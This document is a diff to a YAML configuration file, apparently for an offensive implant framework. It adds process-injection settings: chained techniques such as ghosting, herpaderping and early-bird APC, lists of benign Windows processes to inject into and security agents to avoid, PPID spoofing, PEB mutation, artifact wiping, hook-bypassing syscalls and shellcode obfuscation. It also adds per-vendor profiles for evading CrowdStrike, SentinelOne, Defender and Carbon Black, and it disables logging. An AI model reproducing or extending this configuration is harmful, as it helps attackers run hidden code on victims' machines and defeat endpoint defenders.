@@ -198,6 +198,146 @@ edr_profiles:
     artifact_wipe:
       enabled: false
 
+# === NEW: Process Injection Masterclass Settings ===
+process_injection:
+  enabled: true
+  
+  # AI-Dynamic selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Multi-stage injection chain
+  multi_stage:
+    enabled: true
+    chain:
+      - "ghosting"
+      - "herpaderping"
+      - "transacted_hollowing"
+      - "module_stomping"
+      - "early_bird_apc"
+      - "classic_crt"
+  
+  # Target selection
+  targets:
+    preferred:
+      - "explorer.exe"
+      - "RuntimeBroker.exe"
+      - "dllhost.exe"
+      - "sihost.exe"
+      - "taskhostw.exe"
+    avoid:
+      - "MsMpEng.exe"
+      - "csrss.exe"
+      - "lsass.exe"
+      - "csfalconservice.exe"
+      - "SentinelAgent.exe"
+  
+  # OPSEC Layer
+  opsec:
+    # PPID Spoofing
+    ppid_spoof:
+      enabled: true
+      parent: "explorer.exe"
+    
+    # PEB/TEB Mutation
+    mutation:
+      enabled: true
+      targets:
+        - "peb_being_debugged"
+        - "peb_heap_flags"
+        - "peb_ntglobal_flag"
+    
+    # Artifact Wiping
+    artifact_wipe:
+      enabled: true
+      targets:
+        - "process_params"
+        - "handle_table"
+        - "memory_map"
+    
+    # Pre-injection delay
+    delay_ms: 2000
+  
+  # Syscall options
+  syscalls:
+    enabled: true
+    bypass_hooks: true
+  
+  # Shellcode options
+  shellcode:
+    obfuscate: true
+    cleanup_traces: true
+
+# EDR-specific injection overrides (auto-applied when EDR detected)
+edr_injection_profiles:
+  crowdstrike_falcon:
+    primary_technique: "herpaderping"
+    fallback_chain:
+      - "ghosting"
+      - "transacted_hollowing"
+      - "syscall"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: true
+      targets:
+        - "peb_being_debugged"
+        - "peb_heap_flags"
+    delay_ms: 3000
+    use_syscalls: true
+  
+  sentinelone:
+    primary_technique: "transacted_hollowing"
+    fallback_chain:
+      - "ghosting"
+      - "doppelganging"
+      - "module_stomping"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: true
+      targets:
+        - "peb_image_base"
+        - "teb_client_id"
+    delay_ms: 2500
+    use_syscalls: true
+  
+  defender_atp:
+    primary_technique: "ghosting"
+    fallback_chain:
+      - "early_bird_apc"
+      - "module_stomping"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: false
+    delay_ms: 1500
+    use_syscalls: false
+  
+  carbon_black:
+    primary_technique: "herpaderping"
+    fallback_chain:
+      - "doppelganging"
+      - "transacted_hollowing"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: true
+    delay_ms: 2000
+    use_syscalls: true
+  
+  none:
+    primary_technique: "early_bird_apc"
+    fallback_chain:
+      - "hollowing"
+      - "classic_crt"
+    ppid_spoof:
+      enabled: false
+    mutation:
+      enabled: false
+    delay_ms: 500
+    use_syscalls: false
+
 # Logging
 logging:
   enabled: false
